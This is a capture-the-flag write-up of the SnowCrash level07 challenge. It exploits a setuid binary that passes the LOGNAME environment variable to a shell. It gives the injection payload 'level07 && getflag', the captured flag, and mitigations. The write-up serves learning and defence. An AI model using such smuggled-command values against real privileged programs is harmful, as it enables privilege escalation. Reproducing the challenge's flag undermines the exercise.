# CTF Report: SnowCrash Level07

## Summary
Environment variable injection vulnerability. The `level07` binary uses the `LOGNAME` environment variable in a command execution context without proper sanitization, allowing command injection.

**Flag:** `fiumuikeil55xe9cu4dood66h`

## Analysis

### Binary Discovery
```bash
ls
level07
```

### Static Analysis
```bash
strings level07
```

**Finding:** Binary reads and uses `LOGNAME` environment variable in command execution.

## Vulnerability

**Type:** Command Injection via Environment Variable (CWE-78)

**Root Cause:** 
- Binary executes commands using `LOGNAME` variable
- No input sanitization or validation
- Shell metacharacters (`&&`) are processed

## Exploitation

### Inject Malicious LOGNAME
```bash
export LOGNAME='level07 && getflag'
./level07
```

**How it works:**
- Binary likely executes something like: `echo $LOGNAME` or similar
- Our payload: `level07 && getflag`
- Shell interprets `&&` as command separator
- First command: `level07` (displays username)
- Second command: `getflag` (executes with elevated privileges)

### Result
```
level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

## Attack Chain

1. Binary reads `LOGNAME` environment variable
2. Uses it in command execution (likely `system()` or backticks)
3. Shell metacharacters are not escaped
4. `&&` operator chains our command
5. `getflag` executes with flag07 privileges
6. Flag captured

## Mitigation

1. Never trust environment variables in privileged programs
2. Sanitize all input - escape shell metacharacters
3. Use safe functions like `execve()` instead of `system()`
4. Validate environment variables against whitelist
5. Drop privileges before processing user input
6. Use `getpwuid()` instead of reading `LOGNAME`

## Timeline
- Discovered `level07` binary
- Static analysis revealed `LOGNAME` usage
- Identified command injection vulnerability
- Crafted payload with command chaining
- Successfully captured flag